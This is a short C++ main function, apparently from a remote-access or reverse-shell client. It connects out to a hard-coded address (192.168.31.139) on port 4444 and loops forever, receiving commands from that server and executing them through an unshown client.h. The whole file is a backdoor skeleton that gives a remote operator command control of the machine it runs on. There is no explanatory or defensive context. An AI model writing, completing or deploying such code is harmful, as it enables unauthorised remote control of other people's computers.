#include "client.h"

int main(int argc, char* argv[])
{
  TCP_Client client;
  client.connect_to_server("192.168.31.139", 4444);

  std::string command;
  while(1)
  {
    command = client.receive_data();
    client.process_command(command);
  }
}